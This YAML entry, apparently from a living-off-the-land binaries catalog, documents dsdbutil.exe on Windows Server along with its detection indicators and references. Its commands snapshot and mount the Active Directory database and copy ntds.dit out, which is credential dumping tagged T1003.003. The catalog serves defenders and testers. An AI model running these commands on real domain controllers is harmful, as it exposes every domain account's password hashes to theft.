      document_utf8: "---\nName: dsdbutil.exe\nDescription: Dsdbutil is a command-line tool that is built\
        \ into Windows Server. It is available if you have the AD LDS server role installed. Can be used\
        \ as a command line utility to export Active Directory.\nAliases:\n  - Alias: dsDbUtil.exe  #\
        \ PE Original filename\nAuthor: Ekitji\nCreated: 2023-05-31\nCommands:\n  - Command: dsdbutil.exe\
        \ \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"\n    Description: dsdbutil\
        \ supports VSS snapshot creation\n    Usecase: Snapshoting of Active Directory NTDS.dit database\n\
        \    Category: Dump\n    Privileges: Administrator\n    MitreID: T1003.003\n    OperatingSystem:\
        \ Windows Server 2012, Windows Server 2016, Windows Server 2019\n  - Command: dsdbutil.exe \"\
        activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\"\n    Description: Mounting\
        \ the snapshot with its GUID\n    Usecase: Mounting the snapshot to access the ntds.dit with `copy\
        \ c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`\n\
        \    Category: Dump\n    Privileges: Administrator\n    MitreID: T1003.003\n    OperatingSystem:\
        \ Windows Server 2012, Windows Server 2016, Windows Server 2019\n  - Command: dsdbutil.exe \"\
        activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\"\n    Description: Deletes\
        \ the mount of the snapshot\n    Usecase: Deletes the snapshot\n    Category: Dump\n    Privileges:\
        \ Administrator\n    MitreID: T1003.003\n    OperatingSystem: Windows Server 2012, Windows Server\
        \ 2016, Windows Server 2019\n  - Command: dsdbutil.exe \"activate instance ntds\" \"snapshot\"\
        \ \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\"\n    Description: Mounting with snapshot\
        \ identifier\n    Usecase: Mounting the snapshot identifier 1 and accessing it with `copy c:\\\
        <Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`\n    Category:\
        \ Dump\n    Privileges: Administrator\n    MitreID: T1003.003\n    OperatingSystem: Windows Server\
        \ 2012, Windows Server 2016, Windows Server 2019\n  - Command: dsdbutil.exe \"activate instance\
        \ ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"\n    Description: Deletes the\
        \ mount of the snapshot\n    Usecase: deletes the snapshot\n    Category: Dump\n    Privileges:\
        \ Administrator\n    MitreID: T1003.003\n    OperatingSystem: Windows Server 2012, Windows Server\
        \ 2016, Windows Server 2019\nFull_Path:\n  - Path: C:\\Windows\\System32\\dsdbutil.exe\n  - Path:\
        \ C:\\Windows\\SysWOW64\\dsdbutil.exe\nDetection:\n  - IOC: Event ID 4688\n  - IOC: dsdbutil.exe\
        \ process creation\n  - IOC: Event ID 4663\n  - IOC: Regular and Volume Shadow Copy attempts to\
        \ read or modify ntds.dit\n  - IOC: Event ID 4656\n  - IOC: Regular and Volume Shadow Copy attempts\
        \ to read or modify ntds.dit\nResources:\n  - Link: https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358\n\
        \  - Link: https://www.netwrix.com/ntds_dit_security_active_directory.html\nAcknowledgement:\n\
        \  - Person: bohop\n    Handle: '@bohops'\n  - Person: Ekitji\n    Handle: '@eki_erk'\n"
